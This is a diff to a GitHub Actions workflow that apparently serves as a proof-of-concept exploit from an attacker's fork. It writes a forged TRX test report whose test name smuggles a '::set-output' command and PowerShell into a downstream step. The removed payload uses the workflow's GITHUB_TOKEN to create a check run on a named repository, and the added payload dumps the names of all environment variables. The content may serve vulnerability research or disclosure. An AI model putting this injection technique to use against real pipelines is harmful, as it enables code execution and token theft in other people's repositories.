@@ -14,6 +14,8 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 30
     steps:
+    # This whole file lives in the attacker's fork branch and is what GitHub
+    # executes for the pull_request run.
     - name: Produce attacker controlled test report
       run: |
         mkdir -p test/TestResults
@@ -28,11 +30,10 @@ jobs:
             </UnitTest>
           </TestDefinitions>
           <Results>
-            <UnitTestResult testId="1" testName="EvilTest&#10;::set-output name=url_html::&quot;; Write-Output ('RCE_OK token_len=' + $env:GITHUB_TOKEN.Length); try { $h=@{Authorization=('Bearer ' + $env:GITHUB_TOKEN)}; Invoke-RestMethod -Method Post -Uri 'https://api.github.com/repos/PDFtoMark/gab-poc-docfx-reports/check-runs' -Headers $h -ContentType 'application/json' -Body (@{name='poc-check-run';head_sha=$env:GITHUB_SHA;status='completed';conclusion='success'}|ConvertTo-Json) | Out-Null; Write-Output 'RCE_OK check_run_created' } catch { Write-Output ('RCE_OK check_run_error: ' + $_.Exception.Message) }; &quot;" outcome="Passed" duration="00:00:01" />
+            <UnitTestResult testId="1" testName="EvilTest&#10;::set-output name=url_html::&quot;; Write-Output 'RCE_FROM_FORK_OK'; Get-ChildItem Env: | ForEach-Object { Write-Output ('E:' + $_.Name) }; &quot;" outcome="Passed" duration="00:00:01" />
           </Results>
         </TestRun>
         TRX
-        cat test/TestResults/a.trx
 
     - name: Upload Logs
       uses: actions/upload-artifact@v7
